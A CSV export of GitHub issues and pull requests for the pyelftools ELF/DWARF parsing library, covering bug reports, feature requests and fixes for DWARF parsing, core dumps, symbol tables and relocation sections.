owner,repo,url,id,node_id,number,title,user_id,state,locked,assignee_id,milestone_id,comments,created_at,updated_at,closed_at,author_association,active_lock_reason,body,performed_via_github_app,is_pull_request,repository_url,labels_url,comments_url,events_url,html_url,pull_request_url
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/357,855202490,MDExOlB1bGxSZXF1ZXN0NjEyOTk2NTYy,357,Support Android compressed rel/rela sections,9478918,closed,FALSE,NA,NA,0,2021-04-11T02:34:34Z,2021-04-18T13:30:12Z,2021-04-18T13:30:12Z,CONTRIBUTOR,NA,Ref: https://android.googlesource.com/platform/bionic/+/refs/tags/android-11.0.0_r35/libc/include/elf.h,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/357/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/357/comments,https://api.github.com/repos/eliben/pyelftools/issues/357/events,https://github.com/eliben/pyelftools/pull/357,https://api.github.com/repos/eliben/pyelftools/pulls/357
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/356,855201872,MDExOlB1bGxSZXF1ZXN0NjEyOTk2MTUw,356,Support Android compressed rel/rela sections,9478918,closed,FALSE,NA,NA,0,2021-04-11T02:29:23Z,2021-04-11T02:33:49Z,2021-04-11T02:31:48Z,CONTRIBUTOR,NA,Ref: https://android.googlesource.com/platform/bionic/+/refs/tags/android-11.0.0_r35/libc/include/elf.h,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/356/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/356/comments,https://api.github.com/repos/eliben/pyelftools/issues/356/events,https://github.com/eliben/pyelftools/pull/356,https://api.github.com/repos/eliben/pyelftools/pulls/356
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/355,839941980,MDU6SXNzdWU4Mzk5NDE5ODA=,355,Is it possible to Modify Dwarf sections?,14990173,open,FALSE,NA,NA,1,2021-03-24T17:09:32Z,2021-03-24T21:28:08Z,NA,NONE,NA,"So far I have been using the library to parse DWARF information. But I would like to know if its possible to modify specific attributes of the DWARF file and generate a new DWARF file?

 For example the  DW_AT_LOW_PC attribute of a specific function. I'm looking for a way to implement this as I am compiling Position independent code (PIC) and would like to rebase the address of the functions so I can tell GDB where to locate them at runtime.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/355/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/355/comments,https://api.github.com/repos/eliben/pyelftools/issues/355/events,https://github.com/eliben/pyelftools/issues/355,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/354,817982342,MDExOlB1bGxSZXF1ZXN0NTgxMzc2MTg4,354,fixed parsing for structures containing uids or gids in core dumps for most architectures,13377119,open,FALSE,NA,NA,1,2021-02-27T17:55:26Z,2021-02-27T18:02:31Z,NA,NONE,NA,"This fixes an issue where coredumps loaded from mips would be parsed incorrectly. On `mips`, the `gid` and `uid` field are 32bit long despite the architecture being 32bits. The list of architectures for 16-bit `uid/gid` fields is based on `libbfd` from binutils, which is what readelf, objdump, etc. use.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/354/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/354/comments,https://api.github.com/repos/eliben/pyelftools/issues/354/events,https://github.com/eliben/pyelftools/pull/354,https://api.github.com/repos/eliben/pyelftools/pulls/354
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/353,814281979,MDU6SXNzdWU4MTQyODE5Nzk=,353,Finding size of data of type DW_TAG_Typedef with DW_AT_TYPE form DW_FORM_ref_sig8,79508225,open,FALSE,NA,NA,1,2021-02-23T09:34:27Z,2021-02-23T12:29:48Z,NA,NONE,NA,"When trying to find the size of a field in a struct, the type of the field is a typedef'ed enum.
When looking op the type of the field, the DW_AT_TYPE is DW_FORM_ref_sig8.
```
DIE DW_TAG_typedef, size=24, has_children=False
|DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_string', value=b'language_t', raw_value=b'language_t', offset=4586852)
|DW_AT_type        :  AttributeValue(name='DW_AT_type', form='DW_FORM_ref_sig8', value=13158201686284400073, raw_value=13158201686284400073, offset=4586863)
|DW_AT_decl_file   :  AttributeValue(name='DW_AT_decl_file', form='DW_FORM_udata', value=6, raw_value=6, offset=4586871)
|DW_AT_decl_line   :  AttributeValue(name='DW_AT_decl_line', form='DW_FORM_udata', value=45, raw_value=45, offset=4586872)
|DW_AT_decl_column :  AttributeValue(name='DW_AT_decl_column', form='DW_FORM_udata', value=3, raw_value=3, offset=4586873)
|10090             :  AttributeValue(name=10090, form='DW_FORM_udata', value=12, raw_value=12, offset=4586874)
```
the debug dump output is:
```
<45fd63>: Abbrev Number: 28 (DW_TAG_typedef)
    <45fd64>   DW_AT_name        : language_t
    <45fd6f>   DW_AT_type        : <0xb69b52b7f2336e92>
    <45fd77>   DW_AT_decl_file   : 6
    <45fd78>   DW_AT_decl_line   : 45
    <45fd79>   DW_AT_decl_column : 3
    <45fd7a>   Unknown AT value: 276a: 12
```
In the dwarf 5 standard specification I read:

*The .debug_names section offsets lists provide an offset for the skeleton
compilation unit and eight byte signatures for the type units that appear
only in the .debug_info.dwo. The DIE offsets for these compilation units
and type units refer to the DIEs in the .debug_info.dwo section for the
respective compilation unit and type units.*

When I read this it seems to me that the 64bit DW_FORM_ref_sig8 should point to an entry in the .debug_names section containing information in which dwo section the info for this type is present.
However I don't seem to be able to find access to this .debug_names section.

What can I do to find the size of this field?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/353/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/353/comments,https://api.github.com/repos/eliben/pyelftools/issues/353/events,https://github.com/eliben/pyelftools/issues/353,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/352,796203999,MDU6SXNzdWU3OTYyMDM5OTk=,352,Acquiring address of a .elf file,78064671,open,FALSE,NA,NA,10,2021-01-28T17:24:32Z,2021-02-01T03:28:52Z,NA,NONE,NA,"The line 104 of [example/dwarf_decode_address.py](https://github.com/eliben/pyelftools/blob/46187f45f6085c8e28b7878c4058283d3ba5b812/examples/dwarf_decode_address.py#L104) is the following
```python
process_file(sys.argv[2], 0x400503)
```
which, to my understanding, passes the sample `sample_exe64.elf` file into this program and the hard-coded number `0x400503` is its address.

Now I am wondering how I could obtain this address for my own `.elf` file.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/352/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/352/comments,https://api.github.com/repos/eliben/pyelftools/issues/352/events,https://github.com/eliben/pyelftools/issues/352,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/351,793540702,MDExOlB1bGxSZXF1ZXN0NTYxMjExNDQ4,351,Fix/extend aarch64 register names table,10556585,closed,FALSE,NA,NA,1,2021-01-25T16:43:46Z,2021-01-26T18:49:46Z,2021-01-26T00:11:52Z,CONTRIBUTOR,NA,"It seems as the the register number to name mapping was incomplete. This pull request adds the additional missing registers. The included file demonstrates the issue.
[libc.so.zip](https://github.com/eliben/pyelftools/files/5868031/libc.so.zip)


",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/351/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/351/comments,https://api.github.com/repos/eliben/pyelftools/issues/351/events,https://github.com/eliben/pyelftools/pull/351,https://api.github.com/repos/eliben/pyelftools/pulls/351
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/350,793369720,MDU6SXNzdWU3OTMzNjk3MjA=,350,Missing sources for examples/sample_exe64.elf,784262,closed,FALSE,NA,NA,5,2021-01-25T13:11:40Z,2021-01-28T19:35:13Z,2021-01-25T15:10:41Z,NONE,NA,"I'm building a Debian package and to satisfy packaging requirements, I'd like to know the sources for `examples/sample_exe64.elf`.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/350/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/350/comments,https://api.github.com/repos/eliben/pyelftools/issues/350/events,https://github.com/eliben/pyelftools/issues/350,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/349,793353307,MDU6SXNzdWU3OTMzNTMzMDc=,349,unit tests fail when building release 0.27,784262,open,FALSE,NA,NA,2,2021-01-25T12:47:56Z,2021-01-30T13:39:15Z,NA,NONE,NA,"Hello

I'm building on top of the 0.27 release from pypi

Most of the tests pass but the following two are failing:
```
======================================================================
ERROR: test_parse_shared_library (test.test_ehabi_elf.TestEHABIELF)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/zyga/packaging/pyelftools-0.27/.pybuild/cpython3_3.8_pyelftools/build/test/test_ehabi_elf.py"", line 32, in test_parse_shared_library
    with open(fname, 'rb') as f:
FileNotFoundError: [Errno 2] No such file or directory: 'test/testfiles_for_unittests/arm_exidx_test.so'

======================================================================
ERROR: test_main (test.test_refaddr_bitness.TestRefAddrOnDWARFv2With64BitTarget)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/zyga/packaging/pyelftools-0.27/.pybuild/cpython3_3.8_pyelftools/build/test/test_refaddr_bitness.py"", line 26, in test_main
    with open(os.path.join('test', 'testfiles_for_unittests', 'arm64_on_dwarfv2.info.dat'), 'rb') as f:
FileNotFoundError: [Errno 2] No such file or directory: 'test/testfiles_for_unittests/arm64_on_dwarfv2.info.dat'
```

Are those perhaps missing files that did not get added to the release tarball because `MANIFEST.in` is missing
```
recursive-include test *.dat *.so
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/349/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/349/comments,https://api.github.com/repos/eliben/pyelftools/issues/349/events,https://github.com/eliben/pyelftools/issues/349,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/348,784691810,MDExOlB1bGxSZXF1ZXN0NTUzODQzMDAx,348,Change pid_t elements in Elf_Prpsinfo to be 32 bit sized,2498805,closed,FALSE,NA,NA,1,2021-01-13T00:30:02Z,2021-01-13T00:31:47Z,2021-01-13T00:31:47Z,CONTRIBUTOR,NA,`pid_t` ends up typedefing down to `int` in both 32-bit and 64-bit environments. This fix makes 32-bit core files parse correctly.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/348/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/348/comments,https://api.github.com/repos/eliben/pyelftools/issues/348/events,https://github.com/eliben/pyelftools/pull/348,https://api.github.com/repos/eliben/pyelftools/pulls/348
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/347,784687815,MDExOlB1bGxSZXF1ZXN0NTUzODM5NjI2,347,fix wrong prpsinfo in 32bit coredump,13167376,closed,FALSE,NA,NA,3,2021-01-13T00:19:13Z,2021-01-20T13:58:51Z,2021-01-20T13:58:50Z,CONTRIBUTOR,NA,"According to https://elixir.bootlin.com/linux/v5.10.7/source/include/linux/elfcore.h
ELF PRPSINFO is defined as 
~~~
struct elf_prpsinfo
{
	char	pr_state;	/* numeric process state */
	char	pr_sname;	/* char for pr_state */
	char	pr_zomb;	/* zombie */
	char	pr_nice;	/* nice val */
	unsigned long pr_flag;	/* flags */
	__kernel_uid_t	pr_uid;
	__kernel_gid_t	pr_gid;
	pid_t	pr_pid, pr_ppid, pr_pgrp, pr_sid;
	/* Lots missing */
	char	pr_fname[16];	/* filename of executable */
	char	pr_psargs[ELF_PRARGSZ];	/* initial part of arg list */
};
~~~
and `pid_t` is defined at
~~~
typedef __kernel_pid_t		pid_t;
~~~
`__kernel_pid_t` is defined at 
~~~
typedef int		__kernel_pid_t;
~~~

so `pr_pid, pr_ppid, pr_pgrp, pr_sid` should be all 4bytes
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/347/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/347/comments,https://api.github.com/repos/eliben/pyelftools/issues/347/events,https://github.com/eliben/pyelftools/pull/347,https://api.github.com/repos/eliben/pyelftools/pulls/347
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/346,784163503,MDExOlB1bGxSZXF1ZXN0NTUzMzk4NzE4,346,dynamic.py: move logic around to allow symbol access more easily,6428272,closed,FALSE,NA,NA,0,2021-01-12T11:44:17Z,2021-01-12T15:03:48Z,2021-01-12T15:03:48Z,CONTRIBUTOR,NA,"So far, the implementation of `num_symbols()` and `get_symbol()` in the `DynamicSegment` class depended on `iter_symbols()`. However, most part of `iter_symbols()` is actually about determining the number of symbols. Let's move that logic to the correct method and use it in `iter_symbols()`.

Additionally, in an ELF file without any exported symbols, the hash table will be empty and will thus return a too low number of symbols. However, a loader might still need to access the imported symbols (which also have an entry in the symbol table, with `st_shndx` set to `SHN_UNDEF`). To allow this, make `get_symbol()` take any index and simply read the symbol data from the corresponding index, and use `get_symbol()` from `iter_symbols()`. This way, one can for example use symbol index 
 information from relocation entries to directly access the symbol data.

These changes also make the logic in `DynamicSegment` resemble the code in `SymbolTableSection` more closely.

Fixes: #342",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/346/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/346/comments,https://api.github.com/repos/eliben/pyelftools/issues/346/events,https://github.com/eliben/pyelftools/pull/346,https://api.github.com/repos/eliben/pyelftools/pulls/346
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/345,783143871,MDExOlB1bGxSZXF1ZXN0NTUyNTUxNTY1,345,ELFFile: allow filtering of sections by type in iter_sections,6428272,closed,FALSE,NA,NA,0,2021-01-11T07:42:02Z,2021-01-12T00:27:25Z,2021-01-12T00:27:25Z,CONTRIBUTOR,NA,"As stated in the corresponding issue, we can already filter the output of Dynamic.iter_tags() by the type of the tag we're looking for.

Let's adapt the iteration over the sections of the ELF file so that it only yields sections of a certain type if the optional type parameter is passed to iter_sections().

By doing this we can also simplify two call sites inside the ELFFile class.

Fixes: #344",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/345/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/345/comments,https://api.github.com/repos/eliben/pyelftools/issues/345/events,https://github.com/eliben/pyelftools/pull/345,https://api.github.com/repos/eliben/pyelftools/pulls/345
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/344,778502987,MDU6SXNzdWU3Nzg1MDI5ODc=,344,"Introduce sections.iter_sections(self, type=None) method",628907,closed,FALSE,NA,NA,4,2021-01-05T01:46:34Z,2021-01-12T00:27:25Z,2021-01-12T00:27:25Z,NONE,NA,"Please consider add an optimised menthod iter_sections() which optionally takes the section type, similar to the existing iter_tags().

I have noticed that, when working with raw archives the overhead or looping over the elf header becomes quite obvious. In one particular [use-case](https://lists.archlinux.org/pipermail/arch-projects/2021-January/005411.html) switching from iter_tags() to iter_tags(type) has resulted in massive speed increase.

While I don't expect the results to be quite as significant, the consistent API in itself is worth it.

Thanks in advance",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/344/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/344/comments,https://api.github.com/repos/eliben/pyelftools/issues/344/events,https://github.com/eliben/pyelftools/issues/344,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/343,771984195,MDU6SXNzdWU3NzE5ODQxOTU=,343,Incorrect offset in CU iter_DIE_children,40833477,open,FALSE,NA,NA,0,2020-12-21T08:51:22Z,2020-12-21T08:51:22Z,NA,NONE,NA,"When iterating DIEs children in a compile unit the offset is calculated based on:
```
elif ""DW_AT_sibling"" in child.attributes:
	sibling = child.attributes[""DW_AT_sibling""]
	cur_offset = sibling.value + self.cu_offset
```
If sibling.form is of type DW_FORM_ref_addr the cur_offset will be incorrect. The elf I am using has both DW_FORM_ref_addr and DW_FORM_ref4",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/343/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/343/comments,https://api.github.com/repos/eliben/pyelftools/issues/343/events,https://github.com/eliben/pyelftools/issues/343,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/342,743270716,MDU6SXNzdWU3NDMyNzA3MTY=,342,Not all symbols are reachable via`Dynamic.get_symbol`,169495,closed,FALSE,NA,NA,2,2020-11-15T14:40:54Z,2021-01-12T15:03:48Z,2021-01-12T15:03:48Z,NONE,NA,"It looks like `Dynamic.get_symbol` attempts to guess the number of symbols in the binary (via some heuristic), then creates a list of all the symbols and retrieves the requested one.

This can be somewhat problematic is some ELF as can be seen in the attached [sample.zip](https://github.com/eliben/pyelftools/files/5542539/sample.zip)
:

```python
with open(""sample"", ""rb"") as elf_stream:
    elf = ELFFile(elf_stream)
    dynamic = find_segment(elf, ""PT_DYNAMIC"")
    for _, rel_table in dynamic.get_relocation_tables().items():
        for rel in rel_table.iter_relocations():
            symbol_index = rel[""r_info_sym""]
            if symbol_index:
                try:
                    print(""Reloc@0x{:x}={}"".format(
                        rel[""r_offset""],
                        dynamic.get_symbol(symbol_index).name))
                except IndexError:
                    print(""Can't find symbol for reloc@0x{:x}(index={})"".format(
                        rel[""r_offset""],
                        symbol_index))
```

As you can see, the symbols specified in the relocation entries can not be reached. A loader would not run into such a problem as it does not ""know"" the number of symbols, it just trusts the relocation table to contain the correct symbol indices and just accesses them as if the symbol table is an unbound array.

This is just to show that there's nothing wrong with the ELF in question. It loads and runs correctly. The fact that it has an empty symbol hash table (the reason for the faulty symbol count guess) won't stop it from functioning.

We can solve this by providing an ""unrestricted"" symbol resolution method to `Dynamic`:

```python
class Dynamic:
    # ...
    def get_symbol_unrestricted(self, index):
        _, tab_offset = self.get_table_offset(""DT_SYMTAB"")

        symbol_size = self.elfstructs.Elf_Sym.sizeof()

        string_table = self._get_stringtable()

        symbol = struct_parse(
                self.elfstructs.Elf_Sym,
                self._stream,
                index * symbol_size + tab_offset,
                )

        symbol_name = string_table.get_string(symbol[""st_name""])

        return Symbol(symbol, symbol_name)
```

Thanks
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/342/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/342/comments,https://api.github.com/repos/eliben/pyelftools/issues/342/events,https://github.com/eliben/pyelftools/issues/342,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/341,731960810,MDU6SXNzdWU3MzE5NjA4MTA=,341,DW_AT_type        : signature: 0x9076313a8afb4d4d,15023529,open,FALSE,NA,NA,4,2020-10-29T03:17:19Z,2021-02-26T13:41:24Z,NA,NONE,NA,"hello  I have a problem with using readelf，when i use readelf to parse  file (.elf)
i found some of DW_TAG_typedef  the DW_AT_type        : signature: 0x9076313a8afb4d4d.
what dose it means,  how to remove that   signature: 0x9076313a8afb4d4d.    and let the the DW_AT_type become a normal value
 thank you!!",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/341/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/341/comments,https://api.github.com/repos/eliben/pyelftools/issues/341/events,https://github.com/eliben/pyelftools/issues/341,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/340,730417762,MDU6SXNzdWU3MzA0MTc3NjI=,340,Better support for compressed sections,1130906,open,FALSE,NA,NA,0,2020-10-27T12:44:36Z,2020-10-27T12:44:36Z,NA,OWNER,NA,"The .so file from #336 fails full readelf comparison because pyelftools doesn't handle compressed sections sufficiently well. Even in a basic header output, readelf marks compressed sections with a ""c"" like in:

`
[28] .debug_aranges    mips_dwarf      00000000 00a448 002a1d 00   c  0   0  4<<
`

But pyelftools cannot do that yet.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/340/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/340/comments,https://api.github.com/repos/eliben/pyelftools/issues/340/events,https://github.com/eliben/pyelftools/issues/340,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/339,729853583,MDExOlB1bGxSZXF1ZXN0NTEwMjY0OTE3,339,DebugSectionDescriptor.size initialized with decompressed section size,5807738,closed,FALSE,NA,NA,1,2020-10-26T19:43:58Z,2020-10-27T12:36:47Z,2020-10-27T12:36:47Z,CONTRIBUTOR,NA,"Since `DebugSectionDescriptor.size` is being used to validate offsets (e. g. in the abbrev table), it should be initialized to decompressed size as opposed to raw size. Addresses #336.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/339/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/339/comments,https://api.github.com/repos/eliben/pyelftools/issues/339/events,https://github.com/eliben/pyelftools/pull/339,https://api.github.com/repos/eliben/pyelftools/pulls/339
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/338,729345335,MDExOlB1bGxSZXF1ZXN0NTA5ODUxMjU1,338,hash.py: observe endianness when reading hashes,6428272,closed,FALSE,NA,NA,0,2020-10-26T08:02:10Z,2020-10-26T13:19:35Z,2020-10-26T13:07:43Z,CONTRIBUTOR,NA,"Reading the hashes from a GNUHashTable didn't properly use the endianness of the underlying ELF file, so looking up hashes would fail if the byte order of the analyzed file did not match the native byte order of the current machine.

The test file consists of two functions:
```c
int callee(){
    return 42;
}

int caller(){
    return callee();
}
```
and was compiled using `aarch64_be-linux-gcc` (version 8.3 on an x86_64 host) with the `-mbig-endian` and `-shared` command line flags.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/338/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/338/comments,https://api.github.com/repos/eliben/pyelftools/issues/338/events,https://github.com/eliben/pyelftools/pull/338,https://api.github.com/repos/eliben/pyelftools/pulls/338
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/337,727999363,MDU6SXNzdWU3Mjc5OTkzNjM=,337,Any plans for a new release?,6428272,closed,FALSE,NA,NA,4,2020-10-23T07:54:45Z,2020-10-27T14:48:53Z,2020-10-27T14:48:53Z,CONTRIBUTOR,NA,"Seeing that the last release was almost one year ago (https://pypi.org/project/pyelftools/#history) and using some of the features that were implemented over the last year in my own projects, I was wondering if you have any plans to do a new release anytime soon.

Thanks for your ongoing work on pyelftools!",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/337/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/337/comments,https://api.github.com/repos/eliben/pyelftools/issues/337/events,https://github.com/eliben/pyelftools/issues/337,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/336,724595868,MDU6SXNzdWU3MjQ1OTU4Njg=,336,DWARFError while parsing mipsel libgcc.so,10556585,closed,FALSE,NA,NA,6,2020-10-19T13:10:46Z,2020-10-27T12:45:04Z,2020-10-27T12:45:03Z,CONTRIBUTOR,NA,"```
Python 3.7.7 (default, Mar 10 2020, 15:43:33)
Type 'copyright', 'credits' or 'license' for more information
IPython 7.9.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from elftools.elf.elffile import ELFFile
   ...: elf_file = ELFFile(open('linux/mipsel/libgcc.so', 'rb'))
   ...: dwarf_info = elf_file.get_dwarf_info()
   ...: for cu in dwarf_info.iter_CUs():
   ...:     for die in cu.iter_DIEs():
   ...:         die.offset
   ...:
---------------------------------------------------------------------------
DWARFError                                Traceback (most recent call last)
<ipython-input-1-a8cda90efc13> in <module>
      3 dwarf_info = elf_file.get_dwarf_info()
      4 for cu in dwarf_info.iter_CUs():
----> 5     for die in cu.iter_DIEs():
      6         die.offset
      7

~/Library/Python/3.7/lib/python/site-packages/elftools/dwarf/compileunit.py in iter_DIEs(self)
    103             Note that null DIEs will also be returned.
    104         """"""
--> 105         return self._iter_DIE_subtree(self.get_top_DIE())
    106
    107     def iter_DIE_children(self, die):

~/Library/Python/3.7/lib/python/site-packages/elftools/dwarf/compileunit.py in get_top_DIE(self)
     92                 cu=self,
     93                 stream=self.dwarfinfo.debug_info_sec.stream,
---> 94                 offset=self.cu_die_offset)
     95
     96         self._dielist.insert(0, top)

~/Library/Python/3.7/lib/python/site-packages/elftools/dwarf/die.py in __init__(self, cu, stream, offset)
     92         self._parent = None
     93
---> 94         self._parse_DIE()
     95
     96     def is_null(self):

~/Library/Python/3.7/lib/python/site-packages/elftools/dwarf/die.py in _parse_DIE(self)
    171             return
    172
--> 173         abbrev_decl = self.cu.get_abbrev_table().get_abbrev(self.abbrev_code)
    174         self.tag = abbrev_decl['tag']
    175         self.has_children = abbrev_decl.has_children()

~/Library/Python/3.7/lib/python/site-packages/elftools/dwarf/compileunit.py in get_abbrev_table(self)
     76         if self._abbrev_table is None:
     77             self._abbrev_table = self.dwarfinfo.get_abbrev_table(
---> 78                 self['debug_abbrev_offset'])
     79         return self._abbrev_table
     80

~/Library/Python/3.7/lib/python/site-packages/elftools/dwarf/dwarfinfo.py in get_abbrev_table(self, offset)
    132         dwarf_assert(
    133             offset < self.debug_abbrev_sec.size,
--> 134             ""Offset '0x%x' to abbrev table out of section bounds"" % offset)
    135         if offset not in self._abbrevtable_cache:
    136             self._abbrevtable_cache[offset] = AbbrevTable(

~/Library/Python/3.7/lib/python/site-packages/elftools/common/utils.py in dwarf_assert(cond, msg)
     81     """""" Assert that cond is True, otherwise raise DWARFError(msg)
     82     """"""
---> 83     _assert_with_exception(cond, msg, DWARFError)
     84
     85

~/Library/Python/3.7/lib/python/site-packages/elftools/common/utils.py in _assert_with_exception(cond, msg, exception_type)
    107 def _assert_with_exception(cond, msg, exception_type):
    108     if not cond:
--> 109         raise exception_type(msg)

DWARFError: Offset '0x1bc5' to abbrev table out of section bounds

In [2]: import elftools

In [3]: elftools.__version__
Out[3]: '0.26'

In [4]:```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/336/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/336/comments,https://api.github.com/repos/eliben/pyelftools/issues/336/events,https://github.com/eliben/pyelftools/issues/336,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/335,717536444,MDExOlB1bGxSZXF1ZXN0NTAwMDgxNzE2,335,"DWARFv1 constants in enums, DW_FORM_ref parsing",5807738,closed,FALSE,NA,NA,1,2020-10-08T17:36:57Z,2020-10-10T12:38:14Z,2020-10-10T12:38:14Z,CONTRIBUTOR,NA,"[A customer asked for support for DWARF v1.](https://github.com/sevaa/dwex/issues/11)

Building support for DWARFv1 in `pyelftools` is probably not a fruitful endeavor, since many assumptions of DWARFv2+ break down in v1 (there is no abbrev table, no CU headers, expression and lineprogram format is different). [I've already slapped together a DWARFv1 parser](https://github.com/sevaa/dwex/blob/master/dwex/dwarfone.py) that mimics `pyelftools` and reuses some of its pieces.

That said, there are some `DW_TAG_`, `DW_AT_`, and `DW_FORM_` constants that were deprecated in DWARFv2 but can be seen in the v1 spec, and also in my reference DWARFv1 binary. The enums are otherwise identical (modulo the shift-by-4 thing for attribute codes). I'd rather have those constants right there in `pyelftools` than patch the dicts on the fly.

If there *is* interest in having pyelftools support DWARFv1, let me know.

",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/335/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/335/comments,https://api.github.com/repos/eliben/pyelftools/issues/335/events,https://github.com/eliben/pyelftools/pull/335,https://api.github.com/repos/eliben/pyelftools/pulls/335
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/334,714166416,MDU6SXNzdWU3MTQxNjY0MTY=,334,"Suggestion: try and obtain ""elftools"" PyPI package name",1746967,closed,FALSE,NA,NA,6,2020-10-03T20:08:05Z,2020-10-06T15:06:24Z,2020-10-06T15:06:24Z,NONE,NA,"Thanks for building and maintaining this- it's given us the tooling to do relocations on ARM binaries so they can be run from arbitrary locations in external flash.

I keep trying to `pip install elftools` and getting the wrong package. I realise that's on me but it looks like https://pypi.org/project/elftools/ might be abandoned- it links to a deleted (or made private?) GitHub repository and has only one alpha release in August 2018.

It could be worth reaching out to @jme2041 to ask nicely whether they would consider handing over the name. I've had some success doing this before with Python projects and don't mind doing the legwork.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/334/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/334/comments,https://api.github.com/repos/eliben/pyelftools/issues/334/events,https://github.com/eliben/pyelftools/issues/334,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/333,712732697,MDExOlB1bGxSZXF1ZXN0NDk2MTY2MjYy,333,elf: support for ELF files with a large number of sections,6428272,closed,FALSE,NA,NA,0,2020-10-01T10:58:37Z,2020-10-02T07:52:31Z,2020-10-01T13:45:20Z,CONTRIBUTOR,NA,"As documented in the ELF specification [[link]] and reported in #330, the number of sections (`e_shnum` member of the ELF header) as well as the section table index of the section name string table (`e_shstrndx` member) could exceed the `SHN_LORESERVE` (`0xff00`) value. In this case, the members of the ELF header are set to `0` or `SHN_XINDEX` (`0xffff`), respectively, and the actual values are found in the inital entry of the section header table (which is otherwise set to zeroes).

